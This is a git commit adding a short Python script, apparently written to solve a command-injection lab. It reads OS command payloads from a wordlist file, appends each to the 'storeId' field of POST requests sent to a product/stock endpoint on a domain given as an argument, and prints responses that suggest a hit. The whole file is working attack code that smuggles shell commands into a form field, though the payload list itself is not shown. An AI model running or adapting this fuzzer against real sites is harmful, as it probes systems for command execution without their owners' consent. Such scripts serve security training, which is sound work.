4c9b7fc89f6806365eebcb2e50354fb3395d7fb5
Spadille1337 <98041328+Spadille1337@users.noreply.github.com>
2022-05-01 11:41:08 +0530

    Create script.py

---
+++ Command Injection/Scripts/Simple Case/script.py
@@ -0,0 +1,20 @@
+import sys
+import requests
+import time
+
+if len(sys.argv) != 2:
+    print(f"USAGE: {sys.argv[0]} domain")
+    sys.exit(1)
+
+URL = sys.argv[1]
+
+f=open("OS-Command-Fuzzing.txt","r")
+path="product/stock/"
+for l in f:
+    urli = URL+path
+    payload='1'+ l.strip()
+    data = {'productId':'1','storeId': payload}
+    response = requests.post(url=urli,data=data)
+    if 'not found' not in response.text:
+        print(f"Response : {(response.text).strip()} || Testing Payload : {l}",end="")
+    time.sleep(1)
